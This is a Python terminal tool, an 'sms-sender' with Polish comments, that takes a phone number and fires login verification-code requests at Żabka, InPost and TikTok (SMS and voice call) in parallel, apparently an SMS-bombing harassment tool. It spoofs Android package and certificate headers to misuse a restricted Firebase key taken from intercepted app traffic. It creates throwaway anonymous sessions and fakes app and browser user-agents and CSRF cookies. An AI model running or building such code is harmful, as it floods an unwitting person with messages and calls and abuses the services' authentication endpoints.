import os
import sys
import re
import json
import requests
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Style

# Inicjalizacja colorama dla Windowsa
init(autoreset=True)

# Kolor #d97757 (RGB 217, 119, 87)
ORANGE = "\033[38;2;217;119;87m"
RESET = Style.RESET_ALL
RESET = Style.RESET_ALL
BOLD = Style.BRIGHT

TERMINAL_WIDTH = 119
TERMINAL_HEIGHT = 28

# Firebase Web API key jest ograniczony do apki Android Żabki (pl.zabka.apb2c) -
# wymaga tych naglowkow przy kazdym wywolaniu identitytoolkit/securetoken.
ANDROID_PACKAGE = "pl.zabka.apb2c"
ANDROID_CERT_SHA1 = "FAB089D9E5B41002F29848FC8034A391EE177077"

LOGO = r"""
                                        /$$                                                             
                                                                              /$$                    
                                                                             | $$                    
  /$$$$$$$ /$$$$$$/$$$$   /$$$$$$$         /$$$$$$$  /$$$$$$  /$$$$$$$   /$$$$$$$  /$$$$$$   /$$$$$$ 
 /$$_____/| $$_  $$_  $$ /$$_____//$$$$$$ /$$_____/ /$$__  $$| $$__  $$ /$$__  $$ /$$__  $$ /$$__  $$
|  $$$$$$ | $$ \ $$ \ $$|  $$$$$$|______/|  $$$$$$ | $$$$$$$$| $$  \ $$| $$  | $$| $$$$$$$$| $$  \__/
 \____  $$| $$ | $$ | $$ \____  $$        \____  $$| $$_____/| $$  | $$| $$  | $$| $$_____/| $$      
 /$$$$$$$/| $$ | $$ | $$ /$$$$$$$/        /$$$$$$$/|  $$$$$$$| $$  | $$|  $$$$$$$|  $$$$$$$| $$      
|_______/ |__/ |__/ |__/|_______/        |_______/  \_______/|__/  |__/ \_______/ \_______/|__/      
                                                                                                     
                                                                                                     
                                                                                                        
                                                                                                     
                                                                                                     
                                                                                                     
"""

def visible_len(text):
    """Zwraca długość tekstu bez kodów kolorów ANSI"""
    return len(re.sub(r'\x1b\[[0-9;]*m', '', text))

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_box(text_lines, title="", color=ORANGE, min_width=34, center=True):
    """Rysuje ramkę o absolutnie perfekcyjnych wymiarach (zewnętrzne W)"""
    max_content = max([visible_len(line) for line in text_lines] + [visible_len(title) + 6 if title else 0])
    w = max(max_content + 4, min_width)  # W to Całkowita Szerokość Zewnętrzna
    
    margin_left = (TERMINAL_WIDTH - w) // 2 if center else 0
    margin = " " * margin_left
    
    # 1. Górna linia (Długość = W)
    if title:
        fill_right = w - visible_len(title) - 5
        top_line = f"╭─ {title} " + "─" * fill_right + "╮"
    else:
        top_line = "╭" + "─" * (w - 2) + "╮"
    print(f"{margin}{color}{top_line}{RESET}")
    
    # 2. Linie środkowe (Długość = W)
    for line in text_lines:
        padding_right = " " * (w - visible_len(line) - 3)
        print(f"{margin}{color}│{RESET} {line}{padding_right}{color}│{RESET}")
        
    # 3. Dolna linia (Długość = W)
    print(f"{margin}{color}╰{'─' * (w - 2)}╯{RESET}")

def show_menu():
    clear()

    # Logo
    logo_lines = [line for line in LOGO.strip().split('\n')]
    logo_width = max(visible_len(line) for line in logo_lines)
    logo_margin = " " * ((TERMINAL_WIDTH - logo_width) // 2)
    for line in logo_lines:
        print(f"{logo_margin}{ORANGE}{BOLD}{line}{RESET}")
    print()

    # Menu
    menu_options = [
        f"{ORANGE}[1]{RESET} send",
        f"{ORANGE}[2]{RESET} Restart",
        f"{ORANGE}[3]{RESET} Exit"
    ]
    print_box(menu_options, title="Menu", color=ORANGE, min_width=34)
    print()

def input_box(title, color=ORANGE, min_width=34):
    """Rysuje ramkę z promptem i wczytuje wpisaną wartość"""
    w = max(visible_len(title) + 6, min_width)  # Całkowita Szerokość Zewnętrzna Boxa
    fill_right = w - visible_len(title) - 5

    margin_left = (TERMINAL_WIDTH - w) // 2
    margin = " " * margin_left

    # 1. Górna linia (Długość = W)
    print(f"{margin}{color}╭─ {title} {'─' * fill_right}╮{RESET}")

    # 2. Środek z promptem (Długość = W)
    prompt_str = "  > "
    padding_right = " " * (w - visible_len(prompt_str) - 2)
    print(f"{margin}{color}│{RESET}{prompt_str}{padding_right}{color}│{RESET}")

    # 3. Dolna linia (Długość = W)
    print(f"{margin}{color}╰{'─' * (w - 2)}╯{RESET}")

    # Przesuń kursor: 2 linie w górę, odpowiednio w prawo (za "  > ")
    print(f"\033[2A\033[{margin_left + 5}C", end="", flush=True)
    cmd = input()
    print(f"\033[1B", end="", flush=True)
    return cmd.strip()

def get_input():
    return input_box("Wpisz numer opcji")

def ask_phone():
    """Pyta o 9-cyfrowy numer telefonu, dopóki nie zostanie podany poprawny"""
    while True:
        print()
        phone = input_box("Podaj numer telefonu (9 cyfr)")
        digits = re.sub(r'[\s-]', '', phone)

        if re.fullmatch(r'\d{9}', digits):
            return digits

        print()
        print_box([f"{Fore.YELLOW}⚠ Numer musi mieć dokładnie 9 cyfr{RESET}"], color=Fore.YELLOW)

def keys_path():
    return os.path.join(os.path.dirname(os.path.abspath(__file__)), "keys.json")

def load_keys():
    """Wczytuje całą zawartość keys.json"""
    with open(keys_path(), encoding="utf-8") as f:
        return json.load(f)

def save_keys(keys):
    """Zapisuje zawartość z powrotem do keys.json"""
    with open(keys_path(), "w", encoding="utf-8") as f:
        json.dump(keys, f, indent=2, ensure_ascii=False)

def load_token():
    """Wczytuje bearer_token z keys.json"""
    return load_keys()["bearer_token"]

def create_anonymous_session():
    """Tworzy zupełnie nową anonimową sesję Firebase (gdy nawet refresh_token padnie).
    Zapisuje bearer_token i refresh_token do keys.json. Zwraca (ok, komunikat)."""
    keys = load_keys()
    api_key = keys.get("api_key")

    if not api_key:
        return False, "Brak api_key w keys.json."

    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={api_key}"
    headers = {
        "content-type": "application/json",
        "X-Android-Package": ANDROID_PACKAGE,
        "X-Android-Cert": ANDROID_CERT_SHA1,
    }
    body = {"returnSecureToken": True}

    try:
        resp = requests.post(url, headers=headers, json=body, timeout=20)
    except requests.RequestException as e:
        return False, f"Błąd połączenia przy tworzeniu nowej sesji: {e}"

    try:
        data = resp.json()
    except ValueError:
        return False, f"Tworzenie sesji: HTTP {resp.status_code}: {resp.text[:200]}"

    if not resp.ok or "idToken" not in data:
        err = data.get("error", {}).get("message", json.dumps(data)[:200])
        return False, f"Tworzenie nowej sesji nie powiodło się: {err}"

    keys["bearer_token"] = data["idToken"]
    keys["refresh_token"] = data["refreshToken"]
    save_keys(keys)
    return True, "Utworzono nową sesję"

def refresh_bearer_token():
    """Odświeża bearer_token przez Firebase Secure Token API, używając refresh_token.
    Jeśli refresh_token jest nieważny/brak, tworzy od zera nową sesję anonimową.
    Zapisuje nowy bearer_token i refresh_token do keys.json. Zwraca (ok, komunikat)."""
    keys = load_keys()
    refresh_token = keys.get("refresh_token")
    api_key = keys.get("api_key")

    if not api_key:
        return False, "Brak api_key w keys.json — uzupełnij go z przechwyconego ruchu apki."

    if not refresh_token:
        return create_anonymous_session()

    url = f"https://securetoken.googleapis.com/v1/token?key={api_key}"
    headers = {
        "X-Android-Package": ANDROID_PACKAGE,
        "X-Android-Cert": ANDROID_CERT_SHA1,
    }
    body = {"grant_type": "refresh_token", "refresh_token": refresh_token}

    try:
        resp = requests.post(url, headers=headers, data=body, timeout=20)
    except requests.RequestException as e:
        return False, f"Błąd połączenia przy odświeżaniu tokena: {e}"

    try:
        data = resp.json()
    except ValueError:
        return False, f"Odświeżanie tokena: HTTP {resp.status_code}: {resp.text[:200]}"

    if not resp.ok or "id_token" not in data:
        # refresh_token mógł wygasnąć/zostać unieważniony — spróbuj utworzyć nową sesję od zera
        return create_anonymous_session()

    keys["bearer_token"] = data["id_token"]
    keys["refresh_token"] = data.get("refresh_token", refresh_token)
    save_keys(keys)
    return True, "Token odświeżony"

def is_auth_error(message):
    """Heurystyka: czy komunikat błędu wskazuje na wygasły/nieważny token"""
    needle = message.lower()
    return any(s in needle for s in ["unauthenticated", "unauthorized", "401", "invalid token", "token expired", "expired"])

def send_code(phone):
    """Wysyła mutację SendCode do endpointu Żabki. Zwraca (ok, wiadomość)."""
    url = "https://super-account.spapp.zabka.pl/"
    headers = {
        "content-type": "application/json",
        "accept": "multipart/mixed;deferSpec=20220824,application/graphql-response+json,application/json",
        "apollographql-client-version": "4.41.0+14656",
        "authorization": f"Bearer {load_token()}",
        "accept-language": "pl-PL,pl;q=0.9",
        "x-apollo-operation-type": "mutation",
        "x-client-key": "l6u0R9biQcbEvZy5UybJxw",
        "apollographql-client-name": "pl.zabka.apb2c-apollo-ios",
        "user-agent": "SuperApp/14656 CFNetwork/3890.100.1 Darwin/27.0.0",
        "x-apollo-operation-name": "SendCode",
    }
    body = {
        "extensions": {"clientLibrary": {"name": "apollo-ios", "version": "1.25.3"}},
        "operationName": "SendCode",
        "query": "mutation SendCode($input: SendVerificationCodeInput!) { sendVerificationCode(input: $input) { __typename retryAfterSeconds } }",
        "variables": {"input": {"phoneNumber": {"countryCode": "48", "nationalNumber": phone}}},
    }

    try:
        resp = requests.post(url, headers=headers, json=body, timeout=20)
    except requests.RequestException as e:
        return False, f"Błąd połączenia: {e}"

    try:
        data = resp.json()
    except ValueError:
        return resp.ok, f"HTTP {resp.status_code}: {resp.text[:200]}"

    if resp.ok and "errors" not in data:
        result = data.get("data", {}).get("sendVerificationCode", {})
        retry = result.get("retryAfterSeconds")
        msg = "Kod wysłany"
        if retry is not None:
            msg += f" (ponowna próba za {retry}s)"
        return True, msg

    errors = data.get("errors")
    if errors:
        return False, "; ".join(e.get("message", str(e)) for e in errors)
    return False, f"HTTP {resp.status_code}: {json.dumps(data)[:200]}"

# --- InPost -------------------------------------------------------------------
# Apka InPost Mobile (endpoint logowania po numerze telefonu, easypack24).
# /v1/sendSMSCode to krok przed logowaniem — wysyła SMS z kodem, nie wymaga tokena.
# Zweryfikowane: POST z {"phoneNumber": "..."} -> 200 {"expirationTime": "..."}.
INPOST_BASE = "https://api-inmobile-pl.easypack24.net"

def send_inpost_code(phone):
    """Wysyła żądanie kodu SMS do InPost Mobile. Zwraca (ok, wiadomość)."""
    url = f"{INPOST_BASE}/v1/sendSMSCode"
    headers = {
        "content-type": "application/json",
        "user-agent": "okhttp/4.9.0",
    }
    body = {"phoneNumber": phone}

    try:
        resp = requests.post(url, headers=headers, json=body, timeout=20)
    except requests.RequestException as e:
        return False, f"Błąd połączenia: {e}"

    try:
        data = resp.json()
    except ValueError:
        data = None

    if resp.ok:
        msg = "Kod wysłany"
        if isinstance(data, dict) and data.get("expirationTime"):
            msg += f" (wygasa {data['expirationTime']})"
        return True, msg

    if isinstance(data, dict):
        err = data.get("message") or data.get("error") or json.dumps(data)[:200]
        return False, f"HTTP {resp.status_code}: {err}"
    return False, f"HTTP {resp.status_code}: {resp.text[:200]}"


# --- TikTok -------------------------------------------------------------------
# Endpoint webowy passport TikToka (com.zhiliaoapp.musically).
# passport/web/send_code/ wysyła SMS lub dzwoni (voice) z kodem weryfikacyjnym.
# Nie wymaga podpisu X-Argus/X-Gorgon — wystarczy sesja przeglądarkowa z cookies + CSRF.
TIKTOK_BASE = "https://www.tiktok.com"
TIKTOK_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36"

def _get_tiktok_session():
    """Tworzy sesję z cookies (ttwid, tt_csrf_token) jak prawdziwa przeglądarka."""
    s = requests.Session()
    s.headers.update({
        "user-agent": TIKTOK_UA,
        "referer": f"{TIKTOK_BASE}/login/phone-or-email/phone",
        "origin": TIKTOK_BASE,
    })
    try:
        s.get(f"{TIKTOK_BASE}/login/phone-or-email/phone", timeout=15)
    except requests.RequestException:
        pass  # cookies mogą przyjść mimo błędu
    return s

def _send_tiktok(phone, channel):
    """Wspólna logika dla TikTok SMS i Voice Call. Zwraca (ok, wiadomość)."""
    s = _get_tiktok_session()
    csrf = s.cookies.get("tt_csrf_token", "")

    url = f"{TIKTOK_BASE}/passport/web/send_code/"
    headers = {
        "content-type": "application/x-www-form-urlencoded",
    }
    if csrf:
        headers["x-tt-passport-csrf-token"] = csrf

    body = {
        "mobile": phone,
        "region": "PL",
        "type": "0",
        "channel": channel,   # "sms" lub "voice"
        "aid": "1459",
    }

    try:
        resp = s.post(url, headers=headers, data=body, timeout=20)
    except requests.RequestException as e:
        return False, f"Błąd połączenia: {e}"

    try:
        data = resp.json()
    except ValueError:
        return resp.ok, f"HTTP {resp.status_code}: {resp.text[:200]}"

    msg_field = data.get("message", "")
    err_code = data.get("data", {}).get("error_code", 0)
    desc = data.get("data", {}).get("description", "")

    if msg_field == "success" or err_code == 0:
        return True, "Kod wysłany" if channel == "sms" else "Rozmowa zainicjowana"

    if err_code == 7:
        return False, "Za dużo prób — spróbuj później"
    if desc:
        return False, desc
    return False, f"error_code={err_code}: {json.dumps(data)[:200]}"

def send_tiktok_sms(phone):
    """Wysyła SMS z kodem weryfikacyjnym TikTok. Zwraca (ok, wiadomość)."""
    return _send_tiktok(phone, "sms")

def send_tiktok_voice(phone):
    """Inicjuje rozmowę telefoniczną z kodem TikTok. Zwraca (ok, wiadomość)."""
    return _send_tiktok(phone, "voice")


# --- Rejestr serwisów -------------------------------------------------------------
# send:    fn(phone) -> (ok, msg)
# refresh: fn() -> (ok, msg) wołane raz przy błędzie auth, potem ponowna wysyłka
PROVIDERS = [
    {"name": "Żabka", "send": send_code, "refresh": refresh_bearer_token},
    {"name": "InPost", "send": send_inpost_code, "refresh": None},
    {"name": "TikTok SMS", "send": send_tiktok_sms, "refresh": None},
    {"name": "TikTok ☎", "send": send_tiktok_voice, "refresh": None},
]

def send_with_retry(provider, phone):
    """Wysyła kod jednym serwisem, z jednorazowym odświeżeniem tokena przy błędzie auth."""
    ok, message = provider["send"](phone)
    if not ok and provider.get("refresh") and is_auth_error(message):
        refreshed, refresh_msg = provider["refresh"]()
        if refreshed:
            ok, message = provider["send"](phone)
        else:
            ok, message = False, refresh_msg
    return provider["name"], ok, message

def option_1():
    phone = ask_phone()
    print()
    names = ", ".join(p["name"] for p in PROVIDERS)
    print_box([f"{Fore.CYAN}➤ Wysyłanie kodu na {phone} ({names})...{RESET}"], color=Fore.CYAN)

    with ThreadPoolExecutor(max_workers=len(PROVIDERS)) as ex:
        results = list(ex.map(lambda p: send_with_retry(p, phone), PROVIDERS))

    print()
    for name, ok, message in results:
        color = Fore.GREEN if ok else Fore.RED
        mark = "✔" if ok else "✖"
        print_box([f"{color}{mark} [{name}] {message}{RESET}"], color=color)

    input(f"\n{Style.DIM}Naciśnij Enter aby wrócić...{RESET}")

def restart():
    print()
    print_box([f"{Fore.YELLOW}↻ Restartowanie...{RESET}"], color=Fore.YELLOW)
    os.execl(sys.executable, sys.executable, *sys.argv)

def main():
    if os.name == 'nt':
        os.system(f'mode con: cols={TERMINAL_WIDTH} lines={TERMINAL_HEIGHT}')
        
    while True:
        show_menu()
        cmd = get_input()

        if cmd == "1":
            option_1()
        elif cmd == "2":
            restart()
        elif cmd == "3":
            print()
            print_box([f"{Fore.RED}✖ Wychodzenie...{RESET}"], color=Fore.RED)
            sys.exit(0)
        else:
            print()
            print_box([f"{Fore.YELLOW}⚠ Nieprawidłowa opcja{RESET}"], color=Fore.YELLOW)
            input(f"\n{Style.DIM}Naciśnij Enter aby wrócić...{RESET}")

if __name__ == "__main__":
    main()
